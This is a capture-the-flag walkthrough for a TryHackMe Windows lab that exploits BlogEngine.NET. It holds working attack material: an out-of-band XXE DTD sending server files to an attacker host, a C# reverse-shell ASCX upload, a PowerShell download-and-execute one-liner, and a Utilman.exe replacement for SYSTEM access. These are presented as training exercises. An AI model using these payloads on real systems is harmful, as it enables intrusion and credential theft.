# [Exfilibur](https://tryhackme.com/room/exfilibur)

## You’ve been asked to exploit all the vulnerabilities present.

# Find all the flags!

As you go out on your heroic adventure, keep in mind that there may be many challenges in your way. Keep a sharp lookout for "brickwalls" that might act as strong obstacles in your way, much as how strong forts were formerly protected against invaders. Be brave and prudent in your actions, noble cyber-knight!

Can you find all the flags?

### What is the user flag?

1. Perform a full port scan with service and version detection against the target to identify all open services

```bash
nmap -p- -sVC -Pn <TARGET_IP>
```

**Results:**

```
PORT     STATE SERVICE       VERSION
80/tcp   open  http          Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
|_http-title: 403 - Forbidden: Access is denied.
| http-methods:
|_  Potentially risky methods: TRACE
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| ssl-cert: Subject: commonName=EXFILIBUR
| Not valid before: 2026-05-09T12:56:52
|_Not valid after:  2026-11-08T12:56:52
|_ssl-date: 2026-05-10T13:09:10+00:00; 0s from scanner time.
| rdp-ntlm-info:
|   Target_Name: EXFILIBUR
|   NetBIOS_Domain_Name: EXFILIBUR
|   NetBIOS_Computer_Name: EXFILIBUR
|   DNS_Domain_Name: EXFILIBUR
|   DNS_Computer_Name: EXFILIBUR
|   Product_Version: 10.0.17763
|_  System_Time: 2026-05-10T13:09:05+00:00
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

2. Perform directory enumeration against the web server to discover hidden paths

```bash
gobuster dir -u http://<TARGET_IP> -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

> The scan reveals a `/blog` directory accessible on the server.

3. Navigate to `http://<TARGET_IP>/blog` the page footer reveals the blog is powered by **BlogEngine.NET 3.3.7.0**. This version is known to be affected by multiple critical vulnerabilities: a directory traversal in the file manager API (CVE-2019-10719) and an XXE injection via the APML syndication endpoint (CVE-2019-10720), which can be chained together to exfiltrate sensitive files directly from the server without authentication.

4. Exploit the directory traversal vulnerability in the file manager API. The `path` parameter does not properly sanitize `../` sequences, allowing traversal above the web root. Navigate to the following URL to begin traversing upward from the blog directory: `http://<TARGET_IP>/blog/api/filemanager?path=%2F..%2f..%2f`. The response XML lists several directories and files, with multiple references to an `App_Data` folder, a directory used by BlogEngine.NET to store sensitive application data including user credentials.

5. Navigate directly to the `App_Data` directory to enumerate its contents: `http://<TARGET_IP>/blog/api/filemanager?path=%2F..%2f..%2fApp_Data` ...

**Results:**

```xml
<FileInstance>
<Created>2/5/2019 5:47:20 PM</Created>
<FileSize>633.00 bytes</FileSize>
<FileType>File</FileType>
<FullPath>/../../App_Data/users.xml</FullPath>
<IsChecked>false</IsChecked>
<Name>users.xml</Name>
<SortOrder>23</SortOrder>
</FileInstance>
```

6. Prepare the XXE OOB attack by creating two files: `oob.xml` and `exfil.dtd`. The `oob.xml` file instructs the XML parser to load the external DTD from the attacker's HTTP server, which in turn reads `users.xml` from the server's filesystem and sends its contents back as a URL query parameter.

**oob.xml**

```xml
<?xml version="1.0"?>
<!DOCTYPE foo SYSTEM "http://<ATTACKER_IP>:445/exfil.dtd">
<foo>&e1;</foo>
```

**exfil.dtd**

```dtd
<!ENTITY % p1 SYSTEM "file:///C:/inetpub/wwwroot/blog/App_Data/users.xml">
<!ENTITY % p2 "<!ENTITY e1 SYSTEM 'http://<ATTACKER_IP>:445/?exfil=%p1;'>">
%p2;
```

7. Start a simple HTTP server on port 445 on the attacking machine to host `exfil.dtd` and receive the exfiltrated data. Port 445 is chosen here as it is commonly allowed through Windows firewalls.

```bash
python3 -m http.server 445
```

8. Trigger the XXE injection by visiting the vulnerable APML syndication endpoint and passing the URL of the malicious `oob.xml` as the feed source. The server will fetch and parse `oob.xml`, load `exfil.dtd`, read `users.xml` from disk, and beacon the file contents back to the attacker's HTTP server: `http://<TARGET_IP>/blog/syndication.axd?apml=http://<ATTACKER_IP>:445/oob.xml`

**Results:**

```
"GET /?exfil=%3CUsers%3E%0D%0A%20%20%3CUser%3E%0D%0A%20%20%20%20%3CUserName%3EAdmin%3C/UserName%3E%0D%0A%20%20%20%20%3CPassword%3EwobS/AvKFPT5qP9FgQyh7C+kc+k+1rBzbOf7Oxfptw0=%3C/Password%3E%0D%0A%20%20%20%20%3CEmail%3Epost@example.com%3C/Email%3E%0D%0A%20%20%20%20%3CLastLoginTime%3E2007-12-05%2020:46:40%3C/LastLoginTime%3E%0D%0A%20%20%3C/User%3E%0D%0A%20%20%3C!--%0D%0A%3CUser%3E%0D%0A%20%20%20%20%3CUserName%3Emerlin%3C/UserName%3E%0D%0A%20%20%20%20%3CPassword%3E%3C/Password%3E%0D%0A%20%20%20%20%3CEmail%3Emark@email.com%3C/Email%3E%0D%0A%20%20%20%20%3CLastLoginTime%3E2023-08-11%2010:58:51%3C/LastLoginTime%3E%0D%0A%20%20%3C/User%3E%0D%0A--%3E%0D%0A%20%20%3CUser%3E%0D%0A%20%20%20%20%3CUserName%3Eguest%3C/UserName%3E%0D%0A%20%20%20%20%3CPassword%3EhJg8YPfarcHLhphiH4AsDZ+aPDwpXIEHSPsEgRXBhuw=%3C/Password%3E%0D%0A%20%20%20%20%3CEmail%3Eguest@email.com%3C/Email%3E%0D%0A%20%20%20%20%3CLastLoginTime%3E2023-08-12%2008:47:51%3C/LastLoginTime%3E%0D%0A%20%20%3C/User%3E%0D%0A%3C/Users%3E HTTP/1.1" 200 -
```

**URL Decoded:**

```xml
<Users>
  <User>
    <UserName>Admin</UserName>
    <Password>wobS/AvKFPT5qP9FgQyh7C+kc+k+1rBzbOf7Oxfptw0=</Password>
    <Email>post@example.com</Email>
    <LastLoginTime>2007-12-05 20:46:40</LastLoginTime>
  </User>
  <!--
<User>
    <UserName>merlin</UserName>
    <Password></Password>
    <Email>mark@email.com</Email>
    <LastLoginTime>2023-08-11 10:58:51</LastLoginTime>
  </User>
-->
  <User>
    <UserName>guest</UserName>
    <Password>hJg8YPfarcHLhphiH4AsDZ+aPDwpXIEHSPsEgRXBhuw=</Password>
    <Email>guest@email.com</Email>
    <LastLoginTime>2023-08-12 08:47:51</LastLoginTime>
  </User>
</Users>
```

> The exfiltrated file reveals three accounts. The `merlin` account is commented out and has an empty password. `Admin` and `guest` have Base64-encoded SHA256 password hashes that need to be cracked.

9. The passwords are stored as Base64-encoded SHA256 hashes. Decode each hash from Base64 and convert to hex for use with offline cracking tools. Save the output to a hash file:

```
Admin:c286d2fc0bca14f4f9a8ff45810ca1ec2fa473e93ed6b0736ce7fb3b17e9b70d
guest:84983c60f7daadc1cb8698621f802c0d9f9a3c3c295c810748fb048115c186ec
```

10. Use John the Ripper to crack the hashes against the rockyou wordlist, specifying the `Raw-SHA256` format to match BlogEngine.NET's hashing scheme:

```bash
john hash --wordlist=/usr/share/wordlists/rockyou.txt --format=Raw-SHA256
```

11. Log in to the BlogEngine.NET admin panel at `http://<TARGET_IP>/blog/Account/login.aspx?ReturnURL=/blog/admin/` using the cracked credentials. The admin panel provides access to post and page management, the file manager, and theme configuration.

12. Browse to the following draft/unpublished page in the admin panel: `http://<TARGET_IP>/blog/admin/app/editor/editpage.cshtml?id=18f1dea7-43fd-4853-87e4-9080584faa14&returnUrl=/blog/admin/#/`. The page content contains King Arthur's system credentials: `Excal1burP@ss1337`.

13. Exploit CVE-2019-6714, an authenticated RCE vulnerability in BlogEngine.NET that allows an user to upload a malicious `PostView.ascx` file which is then executed as a theme component. Create the following file, replacing <ATTACKER_IP> with your machine's IP:

```ascx
<%@ Control Language="C#" AutoEventWireup="true" EnableViewState="false" Inherits="BlogEngine.Core.Web.Controls.PostViewBase" %>
<%@ Import Namespace="BlogEngine.Core" %>

<script runat="server">
  static System.IO.StreamWriter streamWriter;

    protected override void OnLoad(EventArgs e) {
        base.OnLoad(e);

  using(System.Net.Sockets.TcpClient client = new System.Net.Sockets.TcpClient("<ATTACKER_IP>", 4444)) {
    using(System.IO.Stream stream = client.GetStream()) {
      using(System.IO.StreamReader rdr = new System.IO.StreamReader(stream)) {
        streamWriter = new System.IO.StreamWriter(stream);

        StringBuilder strInput = new StringBuilder();

        System.Diagnostics.Process p = new System.Diagnostics.Process();
        p.StartInfo.FileName = "cmd.exe";
        p.StartInfo.CreateNoWindow = true;
        p.StartInfo.UseShellExecute = false;
        p.StartInfo.RedirectStandardOutput = true;
        p.StartInfo.RedirectStandardInput = true;
        p.StartInfo.RedirectStandardError = true;
        p.OutputDataReceived += new System.Diagnostics.DataReceivedEventHandler(CmdOutputDataHandler);
        p.Start();
        p.BeginOutputReadLine();

        while(true) {
          strInput.Append(rdr.ReadLine());
          p.StandardInput.WriteLine(strInput);
          strInput.Remove(0, strInput.Length);
        }
      }
    }
      }
    }

    private static void CmdOutputDataHandler(object sendingProcess, System.Diagnostics.DataReceivedEventArgs outLine) {
     StringBuilder strOutput = new StringBuilder();

         if (!String.IsNullOrEmpty(outLine.Data)) {
           try {
                  strOutput.Append(outLine.Data);
                      streamWriter.WriteLine(strOutput);
                      streamWriter.Flush();
                } catch (Exception err) { }
        }
    }

</script>
<asp:PlaceHolder ID="phContent" runat="server" EnableViewState="false"></asp:PlaceHolder>
```

14. Upload the `PostView.ascx` file using the file manager available on a page edit URL, for example: `http://<TARGET_IP>/blog/admin/app/editor/editpage.cshtml?id=999f2c57-c344-4725-92e1-a7f761a7a8a2`. Use the file upload widget to place the file into the `App_Data/files/` directory on the server.

[SCREEN01]

15. Start a Netcat listener on the attacking machine on the port specified in the shell file:

```bash
nc -lvnp 4444
```

16. Trigger the reverse shell by intercepting the HTTP request to `http://<TARGET_IP>/blog/` and modifying the `theme` cookie value to `../../App_Data/files/`. BlogEngine.NET uses this cookie to select and load the active theme's `PostView.ascx`.

[SCREEN02]

17. Once a shell is received, enumerate local user accounts on the target machine to confirm available accounts:

```bash
net user
```

**Results:**

```
User accounts for \\EXFILIBUR
-------------------------------------------------------------------------------
Administrator            DefaultAccount           Guest
kingarthy                merlin                   WDAGUtilityAccount
```

> The output confirms the presence of the `kingarthy` account whose credentials were found in the draft blog page.

18. Connect to the machine via RDP:

```bash
xfreerdp /v:<TARGET_IP> /u:kingarthy /p:'Excal1burP@ss1337' /cert:ignore
```

19. Navigate to `kingarthy`'s Desktop and retrieve the user flag.

[SCREEN03]

---

### What is the root flag?

1. From the RDP session as `kingarthy`, open a Command Prompt with administrator privileges. Right-click the Start menu and select **Command Prompt (Admin)**.

2. On the attacking machine, download the `EnableAllTokenPrivs.ps1` script and serve it over HTTP:

```bash
wget https://raw.githubusercontent.com/fashionproof/EnableAllTokenPrivs/master/EnableAllTokenPrivs.ps1
```

3. On the target, launch PowerShell, bypass the execution policy, and download and execute the script to activate all available token privileges:

```bash
powershell -ep bypass
IEX(New-Object System.Net.WebClient).DownloadString('http://<ATTACKER_IP>:445/EnableAllTokenPrivs.ps1');
```

4. With `SeTakeOwnershipPrivilege` now active, take ownership of `Utilman.exe`. The Windows Ease of Access utility that runs as `NT AUTHORITY\SYSTEM` when invoked from the lock screen:

```bash
takeown /f C:\Windows\System32\Utilman.exe
```

5. Grant `kingarthy` full control over the file so that it can be overwritten:

```bash
icacls C:\Windows\System32\Utilman.exe /grant kingarthy:F
```

6. Replace `Utilman.exe` with a copy of `cmd.exe`. When the Ease of Access button is clicked from the Windows lock screen, it will now spawn a command prompt running as `SYSTEM`:

```bash
copy cmd.exe Utilman.exe
```

7. Click **Start**, then lock the account. On the lock screen, click the **Ease of Access** icon (bottom-right corner). Because `Utilman.exe` has been replaced with `cmd.exe`, a Command Prompt opens running as `NT AUTHORITY\SYSTEM`.

8. Read the root flag from the Administrator's Desktop:

```bash
type C:\Users\Administrator\Desktop\root.txt.txt
```

[SCREEN04]
